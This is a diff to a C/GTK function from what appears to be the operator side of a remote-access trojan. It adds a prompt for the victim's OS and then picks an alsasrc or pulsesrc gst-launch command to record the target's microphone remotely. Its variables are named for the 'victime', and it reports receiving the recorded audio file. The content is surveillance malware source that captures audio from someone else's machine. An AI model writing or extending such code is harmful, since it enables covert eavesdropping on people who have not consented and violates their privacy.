@@ -598,15 +598,67 @@ void cb_record_micro(GtkButton *button, gpointer user_data)
     GtkWidget *progress_bar_micro = NULL;
     GtkWidget *pbar_hbox = NULL;
     gdouble step_foreward  = 0.0;
-      
+    
+    GtkWidget *select_src_dialog = NULL;
+    GtkWidget *target_OS_entry = NULL;
+    const gchar *target_OS = NULL;
+    
+    GtkWidget *check_input_dialog = NULL;
+     
     GtkTextBuffer *text_buffer = NULL;
     gchar *text = NULL;
     GtkTextIter start;
     GtkTextIter end;
     
      //"gst-launch-1.0 -v alsasrc num-buffers= 500 ! wavenc ! filesink location=output.wav"
+    //gst-launch-1.0 -v pulsesrc num-buffers= 500 ! wavenc ! filesink location=output.wav
     
-    const gchar *command_victime_temp = "gst-launch-1.0 -v alsasrc num-buffers=";
+    
+    select_src_dialog = gtk_dialog_new_with_buttons("Enter the target OS : Ubuntu/Mint/Kali/Debian/Fedora", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+    gtk_widget_set_size_request(select_src_dialog, 360, 100);
+
+    target_OS_entry  = gtk_entry_new();
+    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(select_src_dialog)->vbox), target_OS_entry, TRUE, FALSE, 0);
+
+    gtk_widget_show_all(GTK_DIALOG(select_src_dialog)->vbox);
+    switch(gtk_dialog_run(GTK_DIALOG(select_src_dialog)))
+    {
+        case GTK_RESPONSE_APPLY:
+            target_OS = gtk_entry_get_text(GTK_ENTRY(target_OS_entry));
+            gtk_widget_hide(select_src_dialog);
+            break;
+
+        default:
+            gtk_widget_destroy(select_src_dialog);
+            return;
+    }
+    
+    
+    if(memcmp(target_OS, "Ubuntu", 6) != 0 && memcmp(target_OS, "Mint", 4) != 0 && memcmp(target_OS, "Kali", 4) != 0 && memcmp(target_OS, "Debian", 6) != 0 && memcmp(target_OS, "Fedora", 6) != 0)
+    {
+        check_input_dialog = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_OK, "You did not entered a correct value ....");
+
+        gtk_widget_show_all(GTK_DIALOG(check_input_dialog)->vbox);
+        switch(gtk_dialog_run(GTK_DIALOG(check_input_dialog)))
+        {
+            case GTK_RESPONSE_OK:
+                gtk_widget_destroy(check_input_dialog);
+                return;
+
+            default :
+                gtk_widget_destroy(check_input_dialog);
+                return;
+        }   
+    }
+    
+    const gchar *command_victime_temp = ""; 
+    
+    if(strncmp(target_OS, "Ubuntu", 6) == 0 || strncmp(target_OS, "Kali", 4) == 0 || strncmp(target_OS, "Mint", 4) == 0)
+        command_victime_temp = "gst-launch-1.0 -v alsasrc num-buffers=";
+    
+    if(strncmp(target_OS, "Debian", 6) == 0 || strncmp(target_OS, "Fedora", 6) == 0)
+        command_victime_temp = "gst-launch-1.0 -v pulsesrc num-buffers=";
+    
     gchar *final_victime_cmd = NULL;
     
     size_t len_cmd = strlen(command_victime_temp) + 1;
@@ -650,6 +702,7 @@ void cb_record_micro(GtkButton *button, gpointer user_data)
 
                 gtk_widget_destroy(time_too_long_dialog);
                 gtk_widget_destroy(time_of_rec_dialog);
+                gtk_widget_destroy(select_src_dialog);
                 return;
             }
             break;
@@ -811,6 +864,7 @@ void cb_record_micro(GtkButton *button, gpointer user_data)
     printf("Reception du fichier audio success : %ld !!\n", totalRcv);
     
     gtk_widget_destroy(time_of_rec_dialog);
+    gtk_widget_destroy(select_src_dialog);
     
     /** Obtaining the buffer associated with the widget. **/
     text_buffer = gtk_text_view_get_buffer((GtkTextView*)text_view);
